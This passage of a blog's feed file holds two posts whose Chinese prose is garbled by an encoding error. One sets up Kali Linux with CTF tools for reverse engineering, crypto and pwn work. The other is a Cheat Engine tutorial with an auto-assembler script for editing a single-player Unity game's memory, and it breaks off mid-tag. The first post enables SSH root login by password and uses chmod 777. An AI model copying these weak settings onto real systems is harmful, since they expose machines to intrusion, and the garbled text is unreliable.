        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kalié…ç½®æ­¥éª¤</title>
      <link href="/posts/8e948a96.html"/>
      <url>/posts/8e948a96.html</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ä¸å°å¿ƒæŠŠkaliåˆ äº†ï¼Œäºæ˜¯å‡†å¤‡é‡æ–°è£…ä¸€ä¸ªï¼Œä¹‹å‰è£…çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æ€ä¹ˆä»”ç»†ç”¨è¿‡ï¼Œæƒå½“æ˜¯ç”¨æ¥è°ƒè¯•elfï¼Œæ‰€ä»¥è¶æ”¾å‡é‡æ–°é…ä¸€ä¸ªï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹æµç¨‹ã€‚</p><hr><h2 id="å®‰è£…kali-linux">å®‰è£…kali-linux</h2><p>ä¸‹è½½vmware</p><p><a href="https://www.vmware.com/">VMware - Delivering a Digital Foundation For Businesses</a></p><p>ä¸‹è½½kali</p><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p><p><img src="https://s2.loli.net/2024/05/02/LxIoaKvrtRCSXpf.png" alt="image-20240502133052716"></p><p>å»ºè®®å›¾é‡Œé¢æ¡†ç€çš„è¿™ä¸ª</p><p><a href="https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z">ä¸‹è½½ç›´é“¾</a></p><hr><p>ä¸‹è½½å®Œæˆåè§£å‹å¹¶æ‰“å¼€æ–‡ä»¶å¤¹ï¼Œå¦‚æœå·²ç»å®‰è£…å¥½äº†VMwareï¼Œé‚£ä¹ˆåŒå‡»vmxæ–‡ä»¶ä¼šè‡ªåŠ¨å¼¹å‡ºVMwareå¹¶é…ç½®å¥½è™šæ‹Ÿæœºã€‚ç°åœ¨å°±å¯ä»¥ç”¨äº†ã€‚</p><p>ç‚¹å‡»å¼€å¯ã€‚</p><p>è´¦æˆ·å’Œå¯†ç å‡ä¸ºkali</p><p>ç°åœ¨å°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p><hr><h2 id="åŸºæœ¬è®¾ç½®">åŸºæœ¬è®¾ç½®</h2><h3 id="è®¾ç½®ä¸­æ–‡">è®¾ç½®ä¸­æ–‡</h3><p>è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>åœ¨å¯¹åº”é€‰æ¡†æŒ‰ç©ºæ ¼é€‰æ‹©å¯¹åº”è¯­è¨€åŒ…ç„¶åæŒ‰å›è½¦ç¡®è®¤</p><p><img src="https://s2.loli.net/2024/05/02/hnwkv8z2C7GdFir.png" alt="image-20240502140958050"></p><p>åä¸€ä¸ªé¡µé¢åœ¨zh_CN.UTF-8çš„ä½ç½®å›è½¦</p><p>é‡å¯åç”Ÿæ•ˆã€‚</p><h3 id="æ›´æ–°è½¯ä»¶åŒ…">æ›´æ–°è½¯ä»¶åŒ…</h3><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>æ¥æ›´æ–°è½¯ä»¶åŒ…</p><h3 id="æ¢æº">æ¢æº</h3><p>å®‰è£…leafpad</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install leafpad</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>æ·»åŠ æºï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#ä¸­ç§‘å¤§</span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#é˜¿é‡Œäº‘</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#æ¸…åå¤§å­¦</span></span><br><span class="line">deb http:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br></pre></td></tr></table></figure><h3 id="è·å–vscode-å…¶å®ç”¨vimä¹Ÿå¯ä»¥">è·å–vscode/å…¶å®ç”¨vimä¹Ÿå¯ä»¥</h3><p>æ‰“å¼€ç«ç‹ï¼Œç›´æ¥æœç´¢å®˜ç½‘</p><p>ä¸‹è½½debç‰ˆæœ¬</p><p>åœ¨downloadæ–‡ä»¶å¤¹ä½¿ç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i ./(æ–‡ä»¶å)</span><br></pre></td></tr></table></figure><h3 id="æ”¹å˜å­—ä½“">æ”¹å˜å­—ä½“</h3><p>ä¸‹è½½å¥½è‡ªå·±æƒ³è¦çš„å­—ä½“ï¼Œæˆ‘çš„å­—ä½“æ˜¯å†…ç½®çš„</p><p>åœ¨ç»ˆç«¯-æ–‡ä»¶-å‚æ•°é…ç½®-ç¬¬ä¸€è¡Œä¿®æ”¹å­—ä½“å’Œå¤§å°</p><h3 id="é…ç½®ssh">é…ç½®ssh</h3><p>ç¼–è¾‘config</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>#PasswordAuthentication yesè¡Œå»æ‰#</p><p>#PermitRootLogin prohibit-passwordå»æ‰#</p><p>æŠŠprohibit-passwordæ”¹ä¸ºyes</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh start</span><br><span class="line">sudo service ssh status</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¦‚æœæœ‰ï¼š</p><p><code>active(running)</code>å°±ç®—æˆåŠŸ</p><h2 id="åŸºæœ¬ç¯å¢ƒé…ç½®">åŸºæœ¬ç¯å¢ƒé…ç½®</h2><p>ç”±äºä¸æ‡‚webï¼Œæ‰€ä»¥åªé…äº†å…¶å®ƒç¯å¢ƒ</p><h3 id="REç¯å¢ƒé…ç½®">REç¯å¢ƒé…ç½®</h3><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ”¾å…¥idaçš„è°ƒè¯•æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linux_server</span><br><span class="line">chmod 777 linux_server64</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æƒé™</p><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ipç«¯å£å·</p><p><img src="https://s2.loli.net/2024/05/02/Jsgn1Mho3uKSp6w.png" alt="image-20240502155336325"></p><p>å…ˆæ‰§è¡Œå¯¹åº”çš„server(å¦‚æœä½ çš„æ–‡ä»¶æ˜¯32ä½çš„å°±ä¸åŠ 64)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_server64</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨idaä¸­è¾“å…¥</p><p><img src="https://s2.loli.net/2024/05/02/TNQqLdpEAug6Vaf.png" alt="image-20240502155358135"></p><p>è°ƒè¯•æˆåŠŸ</p><h3 id="CRYç¯å¢ƒé…ç½®">CRYç¯å¢ƒé…ç½®</h3><h4 id="å®‰è£…docker">å®‰è£…docker</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker docker-compose </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æˆ–</span></span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å¯åŠ¨dockeræœåŠ¡</span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">åˆ—å‡ºdockerç°æœ‰é•œåƒ</span></span><br><span class="line">docker images</span><br><span class="line"> </span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>å¦‚æœå¼¹å‡º</p><p><img src="https://s2.loli.net/2024/05/02/PGaHBt7Fr8IJisT.png" alt="image-20240502161037944"></p><p>è¡¨æ˜æˆåŠŸ</p><h4 id="å®‰è£…sage-math">å®‰è£…sage-math</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>å¯åŠ¨docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sagemath/sagemath</span><br></pre></td></tr></table></figure><p>æ‹‰å–é•œåƒ</p><p>æœ€å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it sagemath/sagemath:latest</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/aDfsTwqE79OztFQ.png" alt="image-20240502161640136"></p><p>æˆåŠŸ</p><p>ç”±äºsageçš„pythonå¥½åƒæ¨¡å—ä¸é½ï¼Œè¿˜è¦é…ç½®æ¨¡å—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p8888:8888 sagemath/sagemath:latest sage-jupyter</span><br></pre></td></tr></table></figure><p>æ‰“å¼€äº¤äº’å¼ç¯å¢ƒï¼Œç‚¹å‡»æœ€ä¸‹é¢çš„é“¾æ¥</p><p><img src="https://s2.loli.net/2024/05/02/Sx1UzhFfamklsEg.png" alt="image-20240502163425729"></p><p>new - terminal</p><p>åœ¨è¿™é‡Œpip installå°±å¥½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br><span class="line">pip install crypto</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/Jnz4YKiud9GDBcI.png" alt="image-20240502164306991"></p><p>å®‰è£…å¥½äº†æµ‹è¯•ä¸€ä¸‹ï¼Œåœ¨newä¸­é€‰æ‹©sagemath10.3</p><p><img src="https://s2.loli.net/2024/05/02/81NgP2YGifK3EDc.png" alt="image-20240502164335278"></p><h3 id="PWNç¯å¢ƒé…ç½®">PWNç¯å¢ƒé…ç½®</h3><h4 id="pwntoolå®‰è£…">pwntoolå®‰è£…</h4><p>å› ä¸ºæ˜¯pyåº“ï¼Œç”¨æ¥å†™expçš„</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install <span class="comment">--upgrade pwntools</span></span><br></pre></td></tr></table></figure><p>å…¶å®åº”è¯¥åœ¨æœ¬æœºå®‰çš„ï¼Œæ„Ÿè§‰æ–¹ä¾¿ä¸€ç‚¹</p><h4 id="pwndbgå®‰è£…">pwndbgå®‰è£…</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h4 id="æ’ä»¶å®‰è£…">æ’ä»¶å®‰è£…</h4><p>peda</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p>pwngdb</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure><p>ç”±äºæ­£å¸¸æƒ…å†µæ’ä»¶ä¸èƒ½ä¸€èµ·ä½¿ç”¨ï¼Ÿï¼Ÿæ‰€ä»¥è¦é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line">sudo leafpad /.gdbinit</span><br></pre></td></tr></table></figure><p>åœ¨å…¶ä¸­å†™å…¥ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwndbg/g</span>dbinit.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/peda/</span>peda.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwngdb/</span>pwngdb.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/Pwngdb/</span>angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>æ³¨æ„ç›®å½•å¿…é¡»å’Œå®‰è£…ä½ç½®ä¸€æ ·ï¼Œä¸Šé¢çš„åœ°å€é»˜è®¤æ˜¯åœ¨~ç›®å½•ä¸‹è½½çš„</p><p>ç„¶å</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line"><span class="built_in">file</span> xxx</span><br><span class="line"><span class="built_in">start</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/jMg94u3cXY5wify.png" alt="image-20240502190833611"></p><p>æˆåŠŸ</p><h3 id="MISCç¯å¢ƒé…ç½®">MISCç¯å¢ƒé…ç½®</h3><p>miscé‡Œé¢éœ€è¦çš„ä¸œè¥¿æœ‰ç‚¹æ‚ï¼Œè€Œä¸”å¾ˆå¤šå…¶å®åœ¨windowsé‡Œé¢éƒ½æœ‰ä»£æ›¿ï¼Œæ‰€ä»¥æ„Ÿè§‰æ²¡ä»€ä¹ˆå¿…è¦ï¼Œä½†æ˜¯ä¿é™©èµ·è§ï¼ˆé˜²æ­¢ä¹‹åæˆ‘ä½œæ­»ï¼‰ï¼Œè¿˜æ˜¯å†™ä¸€ç‚¹</p><h4 id="foremost">foremost</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">foremost -h</span></span><br></pre></td></tr></table></figure><h4 id="binwalk">binwalk</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h4 id="ciphey">ciphey</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> python3-ciphey</span><br></pre></td></tr></table></figure><p>å·®ä¸å¤šè¿™å‡ ä¸ªå·¥å…·å§ï¼ˆ<s>å¼—å¦‚éšæ³¢é€æµ</s>ï¼‰</p><hr><p>ä¹‹ååº”è¯¥ä¹Ÿæœ‰æ›´æ–°QAQ</p><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/huajianyizou/p/kali1.html#_label3">Kaliä¸‹è½½å®‰è£…ä»¥åŠåŸºç¡€é…ç½® - æ¸…å…‰ç…§å½’é€” - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_46318141/article/details/121168812">kaliä¸‹å¯¹Dockerçš„è¯¦ç»†å®‰è£…_kaliå®‰è£…docker-CSDNåšå®¢</a></p><p>[<a href="https://blog.csdn.net/qq_46145027/article/details/124912352">å¯†ç å­¦]åˆ©ç”¨dockerå®‰è£…ä¸ä½¿ç”¨sagemath_kaliå®‰è£…sagemath-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">gdbä¸pedaã€pwngdbã€pwndbgç»„åˆå®‰è£…ä¸ä½¿ç”¨_gdb peda-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CEä¸monoæ¨¡å—_1</title>
      <link href="/posts/b58030d5.html"/>
      <url>/posts/b58030d5.html</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ä¸æƒ³å­¦ä¹ ï¼Œæƒ³ç©æ¸¸æˆï¼Œæ‰€ä»¥å°±æ‰“å¼€äº†ä¸€ä¸ªè‚‰é¸½æ¸¸æˆï¼Œå°è¯•å¼€æŒ‚ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.bilibili.com/read/cv12648903/">ã€CheatEngineåŸºç¡€æ•™ç¨‹ã€‘å››ã€Unity3Dæ¸¸æˆã€Šæ™šä¸Šnanoå¥½ã€‹ä¿®æ”¹å®æˆ˜</a></p><hr><p>å…ˆæ‰“å¼€æ¸¸æˆç›®å½•ï¼Œçœ‹çœ‹æ˜¯å“ªç±»æ¸¸æˆ</p><ul><li>rpgmakerï¼šè§£åŒ…+ç¼–è¾‘å™¨ç”¨å·¥ç¨‹æ–‡ä»¶æ‰“å¼€</li><li>gamemakerï¼šjsåæ··æ·†å¾—åˆ°æºä»£ç </li><li>unity il ï¼šce+dnspy</li><li>unity il2cppï¼šæ¢å¤ç¬¦å·è¡¨idaæ”¹cppä»£ç +ce</li></ul><p>åœ¨Managedæ–‡ä»¶å¤¹ä¸­ï¼š</p><p><img src="https://s2.loli.net/2024/05/01/zCu6egoh4MGdD1b.png" alt="image-20240501224552961"></p><p>å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ˜¯unityæ¸¸æˆ</p><p>é¦–å…ˆè¦æ˜ç¡®ç›®æ ‡ï¼š</p><p>è¿™æ˜¯ä¸€ä¸ªå¡ç‰Œrougelikeæ¸¸æˆï¼Œç©å®¶æ“ä½œ2~4ä¸ªè§’è‰²+ä¸€ä¸ªä¸»è§’æ‰“è´¥å¤æ•°çš„æ•Œäºº</p><p>ä¿®æ”¹é‡‘é’±ï¼ŒæŠ€èƒ½ç‚¹ï¼ˆå‡çº§äººç‰©ï¼‰ï¼Œäººç‰©è¡€é‡ï¼Œæ¯å›åˆè´¹ç”¨</p><p>é‚£ä¹ˆå¼€å§‹</p><hr><h2 id="ä¿®æ”¹åŸºæœ¬æ•°æ®">ä¿®æ”¹åŸºæœ¬æ•°æ®</h2><p>ç”±äºè¿™ä¸ªæ¸¸æˆæ˜¯unityæ¸¸æˆï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ceçš„monoåˆ†ææ¨¡å—æ¥æ–¹ä¾¿åœ°æ£€æµ‹å†…å®¹å¹¶hookå‡½æ•°</p><p><img src="https://s2.loli.net/2024/05/01/WhaZ835mzOniIXE.png" alt="image-20240501232651548"></p><p>è¿™æ ·æ‰“å¼€è¿™ä¸ªåŠŸèƒ½ï¼Œç„¶åæœç´¢é‡‘é’±æ•°é‡ï¼Œç›´åˆ°æ‰¾åˆ°å¯¹åº”çš„å€¼</p><p><img src="https://s2.loli.net/2024/05/01/VfbATiPKu9JMcIX.png" alt="image-20240501232847246"></p><p>å³é”®ï¼ŒæŸ¥æ‰¾æ˜¯ä»€ä¹ˆæ”¹å†™äº†è¿™ä¸ªå€¼</p><p>å¾—åˆ°ï¼š</p><p><img src="https://s2.loli.net/2024/05/01/W3fw4BKvlXYamz9.png" alt="image-20240501233125213"></p><p>è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªä»£ç ï¼Œä¼šå‘ç°è¿™é‡Œçš„åœ°å€æ˜¯å†™æ­»çš„ï¼Œä»¥å­—é¢é‡ç›´æ¥æ”¾åˆ°å†…å®¹é‡Œé¢ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>ç”±äºunityæ˜¯csè¯­è¨€ï¼Œcsåœ¨ç¼–è¯‘æ—¶åªç”Ÿæˆilä¸­é—´ä»£ç ï¼Œåœ¨CLRè™šæ‹Ÿæœºä¸­æ‰§è¡Œï¼Œç›¸å½“äºjavaé‡Œé¢çš„è™šæ‹Ÿæœºã€‚è¿™æ ·ï¼Œå®ƒè¾¹æ‰§è¡Œè¾¹ç¼–è¯‘ï¼Œç›´æ¥æŠŠå¯¹åº”çš„å€¼å†™æ­»åœ¨ç¼–è¯‘å‡ºçš„ä»£ç é‡Œé¢ï¼Œç„¶åç›´æ¥æ‰§è¡Œï¼Œè¿™æ ·å½“ç„¶å¯ä»¥æ¯æ¬¡éƒ½ä½¿ç”¨å­—é¢é‡è€Œæ¯æ¬¡éƒ½å¯ä»¥ä¸ä¸€æ ·ã€‚</p><p>è¿™ä¹Ÿè¯´æ˜ä¸èƒ½é€šè¿‡æ‰¾å¤šçº§æŒ‡é’ˆæ¥å¯»æ‰¾åŸºå€ï¼Œéœ€è¦å¦ä¸€ç§æ–¹æ³•ã€‚</p><p>ç”±äºå¼€å¯äº†monoåˆ†æåŠŸèƒ½ï¼Œåœ¨æ£€æµ‹ç•Œé¢ç‚¹å‡»ï¼šæ˜¾ç¤ºåæ±‡ç¼–ç¨‹åºï¼š</p><p><img src="https://s2.loli.net/2024/05/01/SDkHMu6Xsi4WBvK.png" alt="image-20240501233819497"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æŠŠå‡½æ•°åç¿»è¯‘å‡ºæ¥äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä»å‡½æ•°åä¸‹æ–‡ç« ç›´æ¥æ‰¾å€¼ï¼Œç”±äºå‡½æ•°åæ˜¯ä¸€å®šçš„ï¼Œä»å‡½æ•°åå¼€å§‹çš„åç§»ä¹Ÿæ˜¯ä¸€å®šçš„ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰¾åˆ°å¯¹åº”çš„å˜é‡è€Œä¸éœ€è¦æ‰¾åŸºå€ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æ–¹æ³•æ˜¯é‡‘å¸çš„setæ–¹æ³•</p><p>åœ¨dnspyä¸­æŸ¥çœ‹</p><p><img src="https://s2.loli.net/2024/05/01/rHcURCS4dVo8nwQ.png" alt="image-20240501234129448"></p><p>æ˜¾ç„¶æ‰¾getæ›´å¥½</p><p>åœ¨ceä¸­ctrl+gè·³è½¬:PlayData:get_Gold</p><p>åªæœ‰1cçš„é•¿åº¦</p><p><img src="https://s2.loli.net/2024/05/01/9tNqvX15Gkb26Wp.png" alt="image-20240501234429636"></p><p>å¯ä»¥ç›´æ¥ä»11è¡Œå–å‡ºrax+25cä½œä¸ºgoldçš„å€¼ï¼Œä½†æ˜¯getå’Œsetåœ¨è¿™é‡Œéƒ½æœ‰rax+25cçš„åç§»ï¼Œå¯ä»¥æ€€ç–‘è¿™é‡Œæœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œå¦‚æœå¯ä»¥æ‰¾åˆ°ç»“æ„ä½“å¼€å§‹çš„å€¼ï¼Œç›¸å½“äºæ•´ä¸ªå†…å®¹éƒ½æœ‰äº†ï¼Œåªä¸è¿‡è¿˜æœ‰è§£å†³æ¯ä¸ªå€¼å¯¹åº”çš„å†…å®¹æ˜¯ä»€ä¹ˆçš„é—®é¢˜ã€‚è¿™æ—¶monoåˆ†æåŠŸèƒ½åˆæ´¾ä¸Šç”¨åœºäº†ï¼š</p><p>ctrl+d:</p><p>æŠŠæˆ‘ä»¬é‡‘é’±çš„åœ°å€å¡«è¿›å»-ç»“æ„-å®šä¹‰æ–°çš„ç»“æ„ï¼š</p><p>å®ƒæŠŠæ‰€æœ‰ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥äº†ï¼ˆè¿˜æœ‰åç§»é‡ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2024/05/01/yucfLIpWzjeVgK6.png" alt="image-20240501234828639"></p><p>ä¸€å¼€å§‹çš„å€¼å°±æ˜¯ä¸Šé¢å‡½æ•°ä¸­çš„å­—é¢é‡ï¼Œsoulå°±æ˜¯æŠ€èƒ½ç‚¹ï¼ŒæŠŠè¿™ä¸¤ä¸ªåç§»è®°ä½</p><p>åœ¨å†…å­˜æŸ¥çœ‹ä¸­-å·¥å…·-è‡ªåŠ¨æ±‡ç¼–-å†™è‡ªåŠ¨æ±‡ç¼–è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ENABLE]</span><br><span class="line">&#123;$lua&#125;</span><br><span class="line">if syntaxcheck then return end</span><br><span class="line">if (LaunchMonoDataCollector()==0) then error(&quot;No Mono&quot;) end</span><br><span class="line">;åˆ¤æ–­monoåŠŸèƒ½æ˜¯å¦å¼€å¯</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aobscanregion(getGoldMethod,PlayData:get_Gold,PlayData:get_Gold+FF,48 B8)</span><br><span class="line">;å–åˆ°å¯¹åº”å‡½æ•°å¯¹åº”ä½çš„å¯¹åº”å€¼ï¼ˆç»“æ„ä½“å¼€å§‹ä½ç½®ï¼‰</span><br><span class="line">alloc(Pridata,8)</span><br><span class="line">;ç”Ÿæˆæ ‡ç­¾ï¼Œä»¥æ ‡ç­¾å¼€å¤´çš„å†…å®¹ä½œä¸ºæ ‡ç­¾åŒºåŸŸçš„ä»£ç ï¼Œæ ‡ç­¾å†…å®¹æ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œçš„</span><br><span class="line">registersymbol(Pridata)</span><br><span class="line">;æŠŠæ ‡ç­¾å‡ä¸ºå…¨å±€å˜é‡ï¼Œå¯ä»¥åœ¨å…¶å®ƒä½ç½®ä½¿ç”¨ï¼Œæ¯”å¦‚åˆ¶ä½œæŒ‡é’ˆçš„æ—¶å€™</span><br><span class="line">Pridata:</span><br><span class="line">readmem(getGoldMethod+2,8)</span><br><span class="line">;å°†å¯¹åº”ä½ç½®å†™å…¥å…¨å±€å˜é‡</span><br><span class="line">[DISABLE]</span><br><span class="line">dealloc(Pridata)</span><br><span class="line">unregistersymbol(Pridata)</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬ä¿å­˜åå°±ä¿å­˜äº†å¯¹åº”çš„ç»“æ„ä½“æŒ‡é’ˆ</p><p>ç„¶åæ ¹æ®åç§»ï¼š</p><p><img src="https://s2.loli.net/2024/05/01/pix2qoOGMdzXTIL.png" 